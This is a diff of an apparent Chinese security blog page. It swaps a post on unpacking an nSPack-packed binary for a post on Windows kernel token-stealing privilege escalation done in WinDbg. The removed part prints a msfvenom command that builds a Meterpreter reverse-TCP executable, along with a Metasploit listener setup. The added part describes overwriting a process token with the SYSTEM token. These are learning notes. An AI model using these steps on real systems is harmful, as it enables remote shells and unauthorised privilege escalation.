@@ -22,7 +22,7 @@
 
   
 
-  <title>脱壳 | Hexo</title>
+  <title>Windows令牌提权 | Hexo</title>
 
   
 
@@ -93,7 +93,7 @@
     <div class="header-content">
       <div class="post-text layout-block">
         <div class="layout-margin">
-          <h1 class="title-wrap">脱壳</h1>
+          <h1 class="title-wrap">Windows令牌提权</h1>
           <h2 class="title-sub-wrap">
             <strong>John Doe</strong>
             <span>发布于</span>
@@ -106,7 +106,7 @@
 </ul>
           <ul class="wrap-list dark">
   
-    <li><a href="/tags/%E9%80%86%E5%90%91/">🏷️ 逆向</a></li>
+    <li><a href="/tags/Windows/">🏷️ Windows</a></li>
   
 </ul>
         </div>
@@ -132,33 +132,24 @@
       <section class="article-entry markdown-body layout-margin content-padding--large soft-size--large soft-style--box">
         <h3 id=""><a href="#" class="headerlink" title=""></a></h3><span id="more"></span>
 
-<p>OEP(Original Entry Point)-原始入口点</p>
-<ul>
-<li><p>OEP通常用于描述一个可执行文件在没有被壳（加壳软件或者加密软件）保护的情况下，代码的正常执行起点。</p>
-</li>
-<li><p>当一个软件被加壳保护之后，其执行起点会被改为壳的代码段，真正的程序代码（也就是我们说的OEP）会被加密或者压缩存放在其他位置，只有在适当的时机下才会被解密和加载出来执行。</p>
-</li>
-<li><p>OEP就是反向工程师在分析加壳软件的时候，需要找到的一个非常重要的位置，只有脱掉壳，找到OEP，才能进一步分析和理解程序原始的执行逻辑与功能。</p>
-</li>
-</ul>
-<p>msf生成exe文件</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">生成32位：</span><br><span class="line"></span><br><span class="line">sudo msfvenom -p windows/meterpreter/reverse_tcp -a x86 -f exe LHOST=ip LPORT=端口 &gt; reverse_32bit.exe</span><br><span class="line"></span><br></pre></td></tr></table></figure>
 
-<p>监听</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">use exploit/multi/handler</span><br><span class="line"></span><br><span class="line">set payload windows/meterpreter/reverse_tcp</span><br><span class="line">set lhost 0.0.0.0</span><br><span class="line">set lport xxxx</span><br><span class="line"></span><br><span class="line">run</span><br></pre></td></tr></table></figure>
 
-<p>首先使用peid进行查壳，发现存在nSPack壳</p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/494833795.jpg" alt="1"></p>
-<p>拖入xdbg，先单步运行到pushad，发现esp产生了变动</p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/495055663.jpg" alt="1"></p>
-<p>查看内存，对里面的数据打一个断点，然后运行</p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/495135877.jpg" alt="1"></p>
-<p>运行之后esp又发生了变化，进行单步运行到达OEP</p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/495360368.jpg" alt="1"></p>
-<p>使用插件scylla进行脱壳</p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/495493378.jpg" alt="1"></p>
-<p>双击正常运行</p>
-<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/495561648.jpg" alt="1"></p>
+<h3 id="EPROCESS"><a href="#EPROCESS" class="headerlink" title="_EPROCESS"></a>_EPROCESS</h3><p>_EPROCESS&#96;是一种内核内存结构，它描述了我们所知道的系统进程（或者换句话说 - 系统上运行的每个进程在内核中的某个位置都有其相应的对象），因为它包含诸如进程映像名称、它正在运行的桌面会话、它拥有的其他内核对象的打开句柄数等详细信息， 它拥有什么访问令牌等等.</p>
+<p>首先观看pid找到进程的eprocess地址</p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/%E4%BB%A4%E7%89%8C%E6%8F%90%E6%9D%83/1729509725070.jpg" alt="1"></p>
+<p>注意位置 ：ffffc58de73c3300 是我们的eprocess地址</p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/%E4%BB%A4%E7%89%8C%E6%8F%90%E6%9D%83/1729509803511.jpg" alt="1"></p>
+<p>输入dt _eprocess ffffc58de73c3300就可以检索他的内容，找到token位置</p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/%E4%BB%A4%E7%89%8C%E6%8F%90%E6%9D%83/1729510198787.jpg" alt="1"></p>
+<p>查看自身token，暂未未进行提权</p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/%E4%BB%A4%E7%89%8C%E6%8F%90%E6%9D%83/1729510354310.jpg" alt="1"></p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/%E4%BB%A4%E7%89%8C%E6%8F%90%E6%9D%83/1729510392062.jpg" alt="1"></p>
+<p>此时输入!process 4 1查看一个拥有system权限的令牌地址</p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/%E4%BB%A4%E7%89%8C%E6%8F%90%E6%9D%83/1729510461030.jpg" alt="1"></p>
+<p>使用eq命令进行修改</p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/%E4%BB%A4%E7%89%8C%E6%8F%90%E6%9D%83/1729510519660.jpg" alt="1"></p>
+<p>查看当前权限和token已经提权成功</p>
+<p><img src="/2024/07/15/IPv4%E5%8A%A0%E5%AF%86/%E4%BB%A4%E7%89%8C%E6%8F%90%E6%9D%83/1729510588099.jpg" alt="1"></p>
 
       </section>
 
@@ -166,14 +157,28 @@
       
         <nav class="article-nav">
           
+            <div class="article-nav-item layout-padding">
+  <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
+    
+    <div class="card-text">
+      
+        <a href="/2024/10/21/%E8%84%B1%E5%A3%B3/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">脱壳</h2>
+        </a>
+      
+      <div class="card-text--row">Newer</div>
+    </div>
+  </article>
+</div>
+          
           
             <div class="article-nav-item layout-padding">
   <article class="card-container article-nav-card content-padding--primary soft-size--large soft-style--box">
     
     <div class="card-text">
       
-        <a href="/2024/10/21/Windows%E4%BB%A4%E7%89%8C%E6%8F%90%E6%9D%83/" itemprop="url">
-          <h2 class="card-text--title text-ellipsis">Windows令牌提权</h2>
+        <a href="/2024/10/20/%E5%B8%B8%E8%A7%81winapi/" itemprop="url">
+          <h2 class="card-text--title text-ellipsis">常见winapi</h2>
         </a>
       
       <div class="card-text--row">Older</div>
